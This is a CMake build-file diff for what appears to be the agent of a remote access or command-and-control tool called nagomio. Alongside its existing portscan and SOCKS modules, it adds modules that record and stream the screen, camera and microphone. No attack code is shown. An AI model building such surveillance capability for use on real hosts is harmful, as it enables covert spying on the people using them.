@@ -85,6 +85,13 @@ list(APPEND AGENT_SOURCES
     src/modules/uninstall.cpp
     src/modules/portscan.cpp
     src/modules/socks.cpp
+    src/modules/record_display.cpp
+    src/modules/record_camera.cpp
+    src/modules/record_mic.cpp
+    src/modules/stream_display.cpp
+    src/modules/stream_camera.cpp
+    src/modules/stream_mic.cpp
+    src/modules/stream_stop.cpp
 )
 
 if(WIN32)
@@ -113,8 +120,27 @@ if(NAGOMIO_HTTPS_SUPPORT)
 endif()
 
 if(WIN32)
-    target_link_libraries(nagomio-agent PRIVATE ws2_32 winhttp iphlpapi advapi32 crypt32 gdi32 user32 ntdll bcrypt dbghelp)
+    target_link_libraries(nagomio-agent PRIVATE ws2_32 winhttp iphlpapi advapi32 crypt32 gdi32 user32 ntdll bcrypt dbghelp strmiids winmm ole32)
     if(NAGOMIO_STATIC_RUNTIME)
         target_link_options(nagomio-agent PRIVATE -static -static-libgcc -static-libstdc++)
+    endif()
+else()
+    find_package(X11 REQUIRED)
+    target_link_libraries(nagomio-agent PRIVATE X11::X11 X11::Xext)
+    find_package(PkgConfig QUIET)
+    if(PkgConfig_FOUND)
+        pkg_check_modules(ALSA alsa)
+        if(ALSA_FOUND)
+            target_include_directories(nagomio-agent PRIVATE ${ALSA_INCLUDE_DIRS})
+            target_link_libraries(nagomio-agent PRIVATE ${ALSA_LIBRARIES})
+            target_compile_definitions(nagomio-agent PRIVATE NAGOMIO_HAS_ALSA)
+        endif()
+    else()
+        find_package(ALSA QUIET)
+        if(ALSA_FOUND)
+            target_include_directories(nagomio-agent PRIVATE ${ALSA_INCLUDE_DIR})
+            target_link_libraries(nagomio-agent PRIVATE ${ALSA_LIBRARY})
+            target_compile_definitions(nagomio-agent PRIVATE NAGOMIO_HAS_ALSA)
+        endif()
     endif()
 endif()
